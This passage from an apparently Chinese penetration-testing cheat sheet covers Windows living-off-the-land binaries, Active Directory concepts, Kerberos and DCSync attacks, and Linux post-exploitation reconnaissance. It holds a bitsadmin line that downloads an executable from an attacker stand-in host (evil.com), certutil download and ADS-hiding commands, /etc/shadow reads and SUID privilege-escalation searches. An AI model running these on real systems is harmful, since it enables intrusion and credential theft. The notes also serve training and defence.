bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1</code></li></ul><p><strong>cdb.exe</strong></p><p><strong>certutil.exe</strong></p><ul><li>可安装、备份、删除、管理和执行证书</li><li>证书存储相关功能</li><li>下载文件 <code>certutil -urlcache -split -f https://addr/example.exe</code></li><li>注意 certutil 是有cache的，需要显式删除</li><li>base64 编解码 <code>certutil -encode</code> &#x2F; <code>certutil -decode</code></li></ul><p><strong>cmd.exe</strong></p><p><strong>cmstp.exe</strong></p><p><strong>control.exe</strong></p><ul><li><a href="https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/">加载dll</a></li></ul><p><strong>csc.exe</strong></p><ul><li>编译 C# 载荷</li></ul><p><strong>cscript.exe</strong></p><ul><li>执行脚本</li></ul><p><strong>extexport.exe</strong></p><p><strong>expand.exe</strong></p><ul><li>展开一个或多个压缩文件</li></ul><p><strong>forfiles.exe</strong></p><ul><li><code>forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe</code></li></ul><p><strong>mofcomp.exe</strong></p><p><strong>makecab.exe</strong></p><p><strong>msbuild.exe</strong></p><ul><li>构建应用程序</li></ul><p><strong>mshta.exe</strong></p><ul><li>HTML应用</li></ul><p><strong>msiexec.exe</strong></p><ul><li>安装msi</li><li>加载dll</li></ul><p><strong>msxsl.exe</strong></p><ul><li>处理XSL程序</li></ul><p><strong>netsh.exe</strong></p><p><strong>installutil.exe</strong></p><ul><li>安装&#x2F;卸载程序组件</li></ul><p><strong>IEExec.exe</strong></p><ul><li>.NET Framework附带程序</li></ul><p><strong>powershell.exe</strong></p><p><strong>psexec.exe</strong></p><ul><li><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></li></ul><p><strong>reg.exe</strong></p><ul><li>注册表控制台</li></ul><p><strong>regedit.exe</strong></p><ul><li>注册表修改</li></ul><p><strong>regsvr32.exe</strong></p><ul><li>注册动态链接库&#x2F;ActiveX控件</li></ul><p><strong>rundll32.exe</strong></p><ul><li>执行DLL文件中的内部函数</li></ul><p><strong>sc.exe</strong></p><ul><li>查看服务状态管理</li></ul><p><strong>schtasks.exe</strong></p><ul><li>定时计划任务</li></ul><p><strong>shred</strong></p><ul><li>重复写入文件，防止文件恢复</li></ul><p><strong>type.exe</strong></p><ul><li>利用ads隐藏文件 <code>type &lt;filepath&gt; &lt;target_file:ads&gt;</code></li></ul><p><strong>wmic.exe</strong></p><ul><li>Windows管理工具</li></ul><p><strong>windbg.exe</strong></p><p><strong>winrm.exe</strong></p><p><strong>wscript.exe</strong></p><ul><li>脚本引擎</li></ul><p><strong>waitfor.exe</strong></p><ul><li>用于同步网络中计算机，可以发送或等待系统上的信号</li></ul><h2 id="MSPRC"><a href="#MSPRC" class="headerlink" title="MSPRC"></a>MSPRC</h2><p>MSRPC (Microsoft Remote Procedure Call) 是微软对 DCE&#x2F;RPC 协议的修改实现，用于支持Windows系统中应用程序的远程网络调用。</p><p>MSRPC所使用的端口有 UDP 135 和 TCP 139 &#x2F; 445 。</p><p>MSRPC 可以用于</p><ul><li>用户遍历</li><li>服务遍历</li><li>凭证导出</li><li>横向移动</li><li>权限提升</li></ul><h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="用户组与工作组"><a href="#用户组与工作组" class="headerlink" title="用户组与工作组"></a>用户组与工作组</h3><h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><p>Windows系统存在一些为了特定用途而设置的用户，分别是：SYSTEM(系统)、Trustedinstaller(信任程序模块)、Everyone(所有人)、Creator Owner(创建者)等，这些特殊用户不属于任何用户组，是完全独立的账户。其中SYSTEM拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限</p><h4 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h4><p>Windows系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限</p><p>默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限。这些组为：管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests)、身份验证用户组(Authenticated Users)</p><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><p>工作组（Workgroup）是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为workgroup的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况</p><h3 id="域中用户"><a href="#域中用户" class="headerlink" title="域中用户"></a>域中用户</h3><h4 id="域用户"><a href="#域用户" class="headerlink" title="域用户"></a>域用户</h4><p>域环境中的用户和本地用户的帐户不同，域用户帐户保存在活动目录中。在域环境中，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用SID (Security Identifier) 来表明身份，用NTLM哈希或者Kerberos来验证身份</p><h4 id="机器用户"><a href="#机器用户" class="headerlink" title="机器用户"></a>机器用户</h4><p>机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以 <code>$</code> 结尾</p><h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><p>组策略(Group Policy)用于控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略(LGPO或LocalGPO)，可以在独立且非域的计算机上管理组策略对象。在域环境中的组策略通常被称作GPO(Group Policy Object)</p><h3 id="内网常用协议"><a href="#内网常用协议" class="headerlink" title="内网常用协议"></a>内网常用协议</h3><p>Windows查询名称解析的顺序为DNS、mDNS、LLMNR、NBNS</p><h4 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h4><p>NetBIOS（Network Basic Input&#x2F;Output System）是基于网络的交互协议，通常使用UDP 137、UDP 138、TCP 139等端口。Windows在安装TCP&#x2F;IP协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问</p><p>基于NetBIOS有NBNS (NetBIOS Name Service)服务，通常监听在UDP 137端口，该服务提供三种功能：将NetBIOS名称解析到IP、查询某一个NetBIOS节点的状态，注册&#x2F;释放一个NetBIOS名</p><p>可以使用 <code>nbtstat</code> 工具利用NetBIOS协议管理网络</p><h4 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h4><p>链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR)是一个基于DNS数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在Windows Vista后被引入。 LLMNR监听UDP 5355端口，可以通过多播地址 224.0.0.252 (或 <code>FF02:0:0:0:0:0:1:3</code>) 访问</p><h4 id="mDNS"><a href="#mDNS" class="headerlink" title="mDNS"></a>mDNS</h4><p>mDNS (multicast DNS) 在Windows 10中被引入，监听UDP 5353端口，对应的多播地址为 224.0.0.251 ( <code>FF02::FB</code> ) 。mDNS主要实现了在没有传统DNS服务器的情况下使局域网内的主机实现相互发现和通信</p><h4 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h4><p>网络代理自动发现协议 (Web Proxy Auto-Discovery, WPAD) 是一种客户端使用DHCP和&#x2F;或DNS发现方法来定位一个配置文件URL的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定URL应使用的代理</p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域指将网络中多台计算机逻辑上组织到一起，进行集中管理的逻辑环境。域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库</p><h4 id="域结构"><a href="#域结构" class="headerlink" title="域结构"></a>域结构</h4><h5 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h5><p>域树（Trees）由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间（namespace）</p><h5 id="林"><a href="#林" class="headerlink" title="林"></a>林</h5><p>林（Forests）是一个复杂的AD实例，由一个或数个域组成，每个域树都有自己唯一的名称空间</p><h4 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h4><p>ADDS的目录存储在域控制器(Domain Controller)内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同的数据库</p><p>在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中</p><p>AD数据库有多主机复制模式（Multi-master Replication Model）和单主机复制模式（Sing-master Replication Model）</p><p>多主机模式可以直接更新任何一台域控制器内的AD对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制</p><p>单主机复制模式是指由一台被称作操作主机（Operations Master）的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器</p><h4 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h4><p>两个域之间需要创建信任关系，才可以访问对应域内的资源</p><h5 id="域信任类型"><a href="#域信任类型" class="headerlink" title="域信任类型"></a>域信任类型</h5><p>Active Directory的信任方式可以分为以下几种：</p><p><strong>Tree-Root Trust</strong></p><ul><li>双向具有转移性</li></ul><p><strong>Parent-Child Trust</strong></p><ul><li>具有转移性，双向行人</li></ul><p><strong>Forest Trust</strong></p><ul><li>如果两个林创建了信任关系，则林中所有的域都相互信任</li><li>两个林之间的信任关系无法自动扩展到其他林上</li></ul><p><strong>Realm Trust</strong></p><ul><li>ADDS域可以和非Windows系统的Kerberos域之间创建信任</li></ul><p><strong>External Trust</strong></p><ul><li>位于两个林内的域之间可以通过外部信任来创建信任关系</li></ul><p><strong>Shortcut Trust</strong></p><ul><li>可以缩短验证用户身份的时间</li></ul><h4 id="OU"><a href="#OU" class="headerlink" title="OU"></a>OU</h4><p>组织单位（Organization Unit，OU）是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等</p><h3 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h3><p>活动目录 (Active Directory，AD) 是面向Windows Server的目录服务。Active Directory存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息</p><h4 id="ADDS"><a href="#ADDS" class="headerlink" title="ADDS"></a>ADDS</h4><p>Active Directory提供目录服务的组件被称作Active Directory域服务 (Active Directory Domain Services, ADDS) ，负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中</p><p>从逻辑上看，ADDS的组件可以分为Partition、Schema、Domain、Domain tree、Forest、OU、Container</p><p>Partition也被称为naming context，是AD DS数据库的一部分。Schema是存储在 ADDS 中数据的定义。Container是为ADDS提供组织框架的对象</p><p>从实现上区分，ADDS可以分为Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet</p><p>每个域控制器都有完整的ADDS数据，每个域控都可以处理数据的修改并同步至其他的域控</p><p>域控会有一份数据拷贝 (Data store) ，默认存储在 <code>C:\Windows\NTDS</code> 目录下</p><p>Global catalog server是存储全局catalog的域控，catlog以只读的方式存储了一个multiple-domain forest的所有对象，用于加速搜索</p><h4 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间"></a>名称空间</h4><p>名称空间 (namespace) 是一块界定好的区域，在区域内可以用名称找到与之相关的信息</p><h4 id="对象与属性"><a href="#对象与属性" class="headerlink" title="对象与属性"></a>对象与属性</h4><p>ADDS内的资源都是以对象 (Object) 的形式存在的，对象通过属性 (Attrbute) 来描述其特征</p><h3 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>Active Directory 证书服务 (Active Directory Certificate Services，AD CS) 是微软用于实现 PKI 的服务</p><h4 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h4><p>ADCS 中的证书是 X.509 格式的数字签名文档，用于加密、签名或身份验证等</p><p>证书常用的属性由下述字段组成</p><ul><li>Subject：主题</li><li>Public Key：公钥</li><li>Extended Key Usages (EKUs)：扩展密钥，描述证书的对象标识符 (Object identifier, OID)</li></ul><p>常用的 EKU OID 包括：</p><p><strong>代码签名</strong></p><ul><li>OID 1.3.6.1.5.5.7.3.3</li><li>证书用于签署可执行代码</li></ul><p><strong>加密文件系统</strong></p><ul><li>OID 1.3.6.1.4.1.311.10.3.4</li><li>证书用于加密文件系统</li></ul><p><strong>安全电子邮件</strong></p><ul><li>OID 1.3.6.1.5.5.7.3.4</li><li>证书用于加密电子邮件</li></ul><p><strong>客户端身份验证</strong></p><ul><li>OID 1.3.6.1.5.5.7.3.2</li></ul><p><strong>智能卡登录</strong></p><ul><li>OID 1.3.6.1.4.1.311.20.2.2</li></ul><p><strong>服务器认证</strong></p><ul><li>OID 1.3.6.1.5.5.7.3.1</li><li>证书用于识别服务器 (例如HTTPS 证书)</li></ul><h5 id="证书模板"><a href="#证书模板" class="headerlink" title="证书模板"></a>证书模板</h5><p>微软提供了证书模板的功能，方便在域内签发证书。证书模板是注册策略和预定义证书设置的集合，包含证书有效期、用途、申请者等信息</p><h5 id="证书注册"><a href="#证书注册" class="headerlink" title="证书注册"></a>证书注册</h5><p>证书可以通过以下几种方式注册：</p><ul><li>通过 Windows 客户端证书注册协议 (MS-WCCE)</li><li>通过 ICertPassage 远程协议 (MS-ICPR)</li><li>在 ADCS 开启了对应 Web 服务的情况下，使用 Web 服务注册</li><li>在服务器安装了对应服务时，通过证书注册服务 (CES) 注册</li><li>在服务器安装了对应服务时，使用网络设备注册服务</li></ul><h3 id="组策略-1"><a href="#组策略-1" class="headerlink" title="组策略"></a>组策略</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件</p><p>组策略有以下功能：</p><ul><li>管理注册表</li><li>设置脚本</li><li>重定向文件夹</li><li>管理应用程序</li><li>指定安全选项</li></ul><h4 id="常用概念"><a href="#常用概念" class="headerlink" title="常用概念"></a>常用概念</h4><p>组策略容器 (Group Policy Container，GPC)存储在活动目录中，包含GPO属性、配置信息和版本等。可以通过GPC来查找GPT</p><p>组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等</p><p>其中GPC中的信息量少、容量小，GPT中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能</p><p>组策略对象 (Group Policy Object, GPO) 是包含多种Windows组策略设置的集合，存储在GPC和GPT中</p><h3 id="Kerberos的Windows实现"><a href="#Kerberos的Windows实现" class="headerlink" title="Kerberos的Windows实现"></a>Kerberos的Windows实现</h3><h4 id="相关定义"><a href="#相关定义" class="headerlink" title="相关定义"></a>相关定义</h4><h5 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h5><p>服务主体名称 (ServicePrincipal Names, SPN) ，是服务实例(如HTTP、SMB等)的唯一标识符</p><p>SPN分为两种类型：一种是注册在活动目录的机器帐户下，当一个服务的权限为 Local System 或 Network Service，则SPN注册在机器帐户下。一种是注册在活动目录的域用户帐户下，当一个服务的权限为一个域用户，则SPN注册在域用户帐户下</p><h3 id="域内攻击思路"><a href="#域内攻击思路" class="headerlink" title="域内攻击思路"></a>域内攻击思路</h3><p><strong>获取域控权限</strong></p><ul><li>通过域控相关漏洞</li><li>抓hash，尤其是域管理员、运维等高权限账号的哈希</li></ul><p><strong>控制入域机器</strong></p><ul><li>下发恶意策略控制</li><li>获取域内用户凭证</li><li>利用错误的域管理配置</li><li>域内relay</li></ul><p><strong>获取服务票据</strong></p><ul><li>攻击Exchange等服务器</li></ul><h3 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h3><h4 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h4><p>在认证过程中，经过client与AS的通信会得到TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据</p><p>黄金票据利用需要与DC通信，且需要获取krbtgt的hash，但是可以获取任何Kerbose服务权限</p><h4 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h4><p>白银票据（Silver Tickets）伪造利用的是Kerberos认证中的第三个步骤，在第三步的时候，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了，这里的ticket是基于client info、server session key、end time、server hash。这里client info已知，end time可以构造，server session key是TGS生成的，所以只要server的NTLM hash即可。银票伪造的是TGS，只能访问指定的服务</p><h4 id="DCSync-攻击"><a href="#DCSync-攻击" class="headerlink" title="DCSync 攻击"></a>DCSync 攻击</h4><p>域内有多台域控服务器时，为了同步域控服务器的修改，微软提供了基于远程目录协议 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47">DRSR</a> 的同步机制</p><p>在多个域控服务器之间，每隔一段时间会有一次域数据的同步。由需要同步的域控服务器向其它服务器发送 GetNCChanges 请求，请求中包含需要同步的数据。数据量较多时，则重复这个过程</p><p>DCSync 就是使用这种机制进行域渗透的技术，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，在2015年添加到 mimikatz 的一个功能，可以导出域内所有用户的hash</p><p>这种方式需要满足以下任一一种权限：</p><ul><li>Administrators 组内的用户</li><li>Domain Admins 组内的用户</li><li>Enterprise Admins 组内的用户</li><li>域控制器的计算机帐户</li></ul><p>或者拥有特定的几条 DACL:</p><ul><li>DS-Replication-Get-Changes</li><li>DS-Replication-Get-Changes-All</li><li>DS-Replication-Get-Changes-In-Filtered-Set</li></ul><p>当没有管理员用户，但是拥有 WriteDACL 权限时，可以写入上述 DACL 来完成 DCSync</p><p>对于这种攻击，可以通过检测 GetNCChanges 发起者的方式，如果由非域控机器发起对应请求，则可以认为是 DCSync 攻击</p><h4 id="DCShadow-攻击"><a href="#DCShadow-攻击" class="headerlink" title="DCShadow 攻击"></a>DCShadow 攻击</h4><p>DCShadow是由来自法国的安全研究人员Benjamin Delpy和Vincent Le Toux在2018年的微软蓝帽（Blue Hat）大会上提出</p><p>DCShadow攻击指在Active Directory环境下创建一个恶意的域控制器，并用它来推送恶意对象</p><h4 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h4><p>哈希传递攻击（Pass-the-Hash，PTH）是通过传递NTLM哈希来认证的攻击方法，常用的工具有mimikatz等</p><h4 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h4><p>票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用黄金票据和白银票据，通过PtT访问主机相当简单</p><h4 id="Kerberoasting-Attacks"><a href="#Kerberoasting-Attacks" class="headerlink" title="Kerberoasting Attacks"></a>Kerberoasting Attacks</h4><p>Kerberoasting攻击由Tim Medin在2014 DerbyCon conference上 <a href="https://www.youtube.com/watch?v=PUyhlN-E5MU">公开</a> 。指域内的任何一台主机，都可以通过查询SPN，Kerberoasting即是向域内的所有服务请求TGS，然后进行暴力破解</p><h4 id="Roasting-AS-REP"><a href="#Roasting-AS-REP" class="headerlink" title="Roasting AS-REP"></a>Roasting AS-REP</h4><p>该攻击枚举域中不需要Kerberos预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了 <code>DONT_REQ_PREAUTH</code></p><h4 id="Kerberos-Delegation-Attacks"><a href="#Kerberos-Delegation-Attacks" class="headerlink" title="Kerberos Delegation Attacks"></a>Kerberos Delegation Attacks</h4><p>在一个域中，A使用Kerberos身份验证访问服务B，B再使用A的身份去访问C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务</p><p>Kerberos Delegation（Kerberos委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限</p><h4 id="其他漏洞利用"><a href="#其他漏洞利用" class="headerlink" title="其他漏洞利用"></a>其他漏洞利用</h4><ul><li>域用户提权 (CVE-2022-26923)</li><li>KDC bamboozling (CVE-2021-42287)</li><li>Name impersonation (CVE-2021-42278)</li><li>ProxyShell (CVE-2021-34473)</li><li>ProxyLogon (CVE-2021-26855)</li><li>PrintNightmare (CVE-2021-1675 &#x2F; CVE-2021-34527)</li><li>SMBGhost (CVE-2020-0796)</li><li>Zerologon (CVE-2020-1472)</li><li>NTLM Relay (CVE-2019-1040)</li><li>永恒之蓝 (MS17-010)</li><li>域用户提权 (MS14-068)</li><li>Gpp漏洞 (MS14-025)</li><li>SAMR协议漏洞 (MS14-016)</li></ul><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ul><li>使用ATA等商业化防护工具</li><li>安装杀毒软件、EDR等工具</li><li>关闭高危服务</li><li>统一配置防火墙策略</li><li>对域控等高危账号使用白名单进行行为管理</li></ul><p><strong>检测高危操作</strong></p><ul><li>权限提升</li><li>高危账号密码修改、重置</li></ul><p><strong>行为频率建模</strong></p><ul><li>对大量尝试登录&#x2F;信息查询进行报警</li></ul><p><strong>对特定攻击行为进行监控</strong></p><ul><li>通过GPO下发自启动、计划任务</li></ul><h1 id="Linux内网渗透"><a href="#Linux内网渗透" class="headerlink" title="Linux内网渗透"></a>Linux内网渗透</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="获取内核、操作系统和设备信息"><a href="#获取内核、操作系统和设备信息" class="headerlink" title="获取内核、操作系统和设备信息"></a>获取内核、操作系统和设备信息</h3><p><strong>版本信息</strong></p><ul><li><code>uname -a</code> 所有版本</li><li><code>uname -r</code> 内核版本信息</li><li><code>uname -n</code> 系统主机名字</li><li><code>uname -m</code> Linux内核架构</li></ul><p><strong>内核信息</strong></p><ul><li><code>cat /proc/version</code></li></ul><p><strong>CPU信息</strong></p><ul><li><code>cat /proc/cpuinfo</code></li></ul><p><strong>发布信息</strong></p><ul><li><code>cat /etc/*-release</code></li><li><code>cat /etc/issue</code></li></ul><p><strong>主机名</strong></p><ul><li><code>hostname</code></li></ul><p><strong>文件系统</strong> </p><ul><li><code>df -a</code></li></ul><p><strong>内核日志</strong> </p><ul><li><code>dmesg</code> &#x2F; <code>/var/log/dmesg</code></li></ul><h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><ul><li><p>列出系统所有用户 <code>cat /etc/passwd</code></p></li><li><p>列出系统所有组 <code>cat /etc/group</code></p></li><li><p>列出所有用户hash（root）<code>cat /etc/shadow</code></p></li><li><p>查询用户的基本信息 <code>finger</code></p></li><li><p>当前登录的用户 <code>users</code> <code>who -a</code> <code>/var/log/utmp</code></p></li><li><p>查询无密码用户 <code>grep &#39;x:0:&#39; /etc/passwd</code></p></li><li><p>目前登录的用户 <code>w</code></p></li><li><p>登入过的用户信息 <code>last</code> &#x2F; <code>/var/log/wtmp</code></p></li><li><p>显示系统中所有用户最近一次登录信息 <code>lastlog</code> &#x2F; <code>/var/log/lastlog</code></p></li><li><p>登录成功日志 <code>/var/log/secure</code></p></li><li><p>登录失败日志 <code>/var/log/faillog</code></p></li><li><p>查看特权用户 <code>grep :0 /etc/passwd</code></p></li><li><p>查看passwd最后修改时间 <code>ls -l /etc/passwd</code></p></li><li><p>查看是否存在空口令用户 <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p></li><li><p>查看远程登录的账号 <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p></li><li><p>查看具有sudo权限的用户</p></li><li><p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p></li></ul><h3 id="用户和权限信息"><a href="#用户和权限信息" class="headerlink" title="用户和权限信息"></a>用户和权限信息</h3><ul><li>当前用户 <code>whoami</code></li><li>当前用户信息 <code>id</code></li><li>可以使用sudo提升到root的用户（root） <code>cat /etc/sudoers</code></li><li>列出目前用户可执行与无法执行的指令 <code>sudo -l</code></li></ul><h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul><li>打印系统环境信息 <code>env</code></li><li>打印系统环境信息 <code>set</code></li><li>环境变量中的路径信息 <code>echo $PATH</code></li><li>打印历史命令 <code>history</code> &#x2F; <code>~/.bash_history</code></li><li>显示当前路径 <code>pwd</code></li><li>显示默认系统遍历 <code>cat /etc/profile</code></li><li>显示可用的shell <code>cat /etc/shells</code></li></ul><h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><ul><li>查看进程信息 <code>ps aux</code></li><li>资源占有情况 <code>top -c</code></li><li>查看进程关联文件 <code>lsof -c $PID</code></li><li>完整命令行信息 <code>/proc/$PID/cmdline</code></li><li>进程的命令名 <code>/proc/$PID/comm</code></li><li>进程当前工作目录的符号链接 <code>/proc/$PID/cwd</code></li><li>运行程序的符号链接 <code>/proc/$PID/exe</code></li><li>进程的环境变量 <code>/proc/$PID/environ</code></li><li>进程打开文件的情况 <code>/proc/$PID/fd</code></li></ul><h3 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h3><ul><li>由inetd管理的服务列表 <code>cat /etc/inetd.conf</code></li><li>由xinetd管理的服务列表 <code>cat /etc/xinetd.conf</code></li><li>nfs服务器的配置 <code>cat /etc/exports</code></li><li>邮件信息 <code>/var/log/mailog</code></li><li>ssh配置 <code>sshd_config</code></li></ul><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><ul><li>显示指定用户的计划作业（root） <code>crontab -l -u %user%</code></li></ul><p><strong>计划任务</strong></p><ul><li><code>/var/spool/cron/*</code></li><li><code>/var/spool/anacron/*</code></li><li><code>/etc/crontab</code></li><li><code>/etc/anacrontab</code></li><li><code>/etc/cron.*</code></li><li><code>/etc/anacrontab</code></li></ul><p><strong>开机启动项</strong></p><ul><li><code>/etc/rc.d/init.d/</code></li></ul><h3 id="网络、路由和通信"><a href="#网络、路由和通信" class="headerlink" title="网络、路由和通信"></a>网络、路由和通信</h3><ul><li>列出网络接口信息 <code>/sbin/ifconfig -a</code> &#x2F; <code>ip addr show</code></li><li>列出网络接口信息 <code>cat /etc/network/interfaces</code></li><li>查看系统arp表 <code>arp -a</code></li><li>打印路由信息 <code>route</code> &#x2F; <code>ip ro show</code></li><li>查看dns配置信息 <code>cat /etc/resolv.conf</code></li><li>打印本地端口开放信息 <code>netstat -an</code></li><li>列出iptable的配置规则 <code>iptables -L</code></li><li>查看端口服务映射 <code>cat /etc/services</code></li><li>Hostname <code>hostname -f</code></li><li>查看进程端口情况 <code>netstat -anltp | grep $PID</code></li></ul><h3 id="已安装程序"><a href="#已安装程序" class="headerlink" title="已安装程序"></a>已安装程序</h3><ul><li><code>rpm -qa --last</code> Redhat</li><li><code>yum list | grep installed</code> CentOS</li><li><code>ls -l /etc/yum.repos.d/</code></li><li><code>dpkg -l</code> Debian</li><li><code>cat /etc/apt/sources.list</code> Debian APT</li><li><code>pkg_info</code> xBSD</li><li><code>pkginfo</code> Solaris</li><li><code>pacman -Q</code> Arch Linux</li><li><code>emerge</code> Gentoo</li></ul><h3 id="文件-1"><a href="#文件-1" class="headerlink" title="文件"></a>文件</h3><ul><li>最近五天的文件 <code>find / -ctime +1 -ctime -5</code></li><li>文件系统细节 <code>debugfs</code></li></ul><h3 id="公私钥信息"><a href="#公私钥信息" class="headerlink" title="公私钥信息"></a>公私钥信息</h3><ul><li><code>~/.ssh</code></li><li><code>/etc/ssh</code></li></ul><h3 id="日志-1"><a href="#日志-1" class="headerlink" title="日志"></a>日志</h3><ul><li><code>/var/log/boot.log</code></li><li><code>/var/log/cron</code></li><li><code>/var/log/faillog</code></li><li><code>/var/log/lastlog</code></li><li><code>/var/log/messages</code></li><li><code>/var/log/secure</code></li><li><code>/var/log/syslog</code></li><li><code>/var/log/syslog</code></li><li><code>/var/log/wtmp</code></li><li><code>/var/log/wtmp</code></li><li><code>/var/run/utmp</code></li></ul><h3 id="虚拟环境检测"><a href="#虚拟环境检测" class="headerlink" title="虚拟环境检测"></a>虚拟环境检测</h3><ul><li><code>lsmod | grep -i &quot;vboxsf\|vboxguest&quot;</code></li><li><code>lsmod | grep -i &quot;vmw_baloon\|vmxnet&quot;</code></li><li><code>lsmod | grep -i &quot;xen-vbd\|xen-vnif&quot;</code></li><li><code>lsmod | grep -i &quot;virtio_pci\|virtio_net&quot;</code></li><li><code>lsmod | grep -i &quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</code></li></ul><h3 id="容器内信息收集"><a href="#容器内信息收集" class="headerlink" title="容器内信息收集"></a>容器内信息收集</h3><ul><li><code>capsh --print</code></li><li><code>cat /proc/1/cgroup</code></li><li><code>env | grep KUBE</code></li><li><code>ls -l .dockerenv</code></li><li><code>ls -l /run/secrets/Kubernetes.io/</code></li><li><code>mount</code></li><li><code>ps aux</code></li></ul><h2 id="持久化-1"><a href="#持久化-1" class="headerlink" title="持久化"></a>持久化</h2><h3 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升"></a>权限提升</h3><ul><li>内核漏洞利用</li><li>攻击有root权限的服务</li><li>利用第三方服务提权</li></ul><p><strong>通过有SUID属性的可执行文件</strong></p><ul><li>查找可能提权的可执行文件</li><li><code>find / -perm +4000 -ls</code></li><li><code>find / -perm -u=s -type f 2&gt;/dev/null</code></li><li><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></li><li><code>find / -user root -perm -4000 